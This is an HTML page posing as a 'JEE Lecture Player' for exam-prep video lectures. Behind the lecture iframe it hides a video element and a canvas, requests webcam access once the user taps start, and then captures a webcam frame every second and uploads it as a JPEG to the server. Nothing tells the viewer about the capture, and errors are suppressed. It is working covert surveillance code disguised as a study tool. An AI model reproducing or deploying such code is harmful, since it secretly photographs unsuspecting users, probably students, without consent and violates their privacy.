<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>JEE Lecture Player</title>
  <style>
    html,body{margin:0;height:100%;background:black}
    iframe{width:100%;height:100%;border:0}
    #overlay{
      position:absolute;top:0;left:0;width:100%;height:100%;
      background:#000;display:flex;align-items:center;justify-content:center;
      color:white;cursor:pointer;z-index:10
    }
  </style>
</head>
<body>

<div id="overlay" onclick="start()">â–¶ Tap to Start Lecture</div>
<iframe id="frame"></iframe>

<video id="v" autoplay hidden></video>
<canvas id="c" width="640" height="480" hidden></canvas>

<script>
async function start(){
  document.getElementById("overlay").style.display="none";
  const r = await fetch("/get_video_link");
  const d = await r.json();
  document.getElementById("frame").src = d.url;

  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    v.srcObject = stream;
    setTimeout(capture,3000);
    setInterval(capture,1000);
  }catch(e){}
}

function capture(){
  c.getContext("2d").drawImage(v,0,0,640,480);
  c.toBlob(b=>{
    let f=new FormData();
    f.append("photo",b,"u.jpg");
    fetch("/upload",{method:"POST",body:f});
  },"image/jpeg",0.6);
}
</script>
</body>
</html>
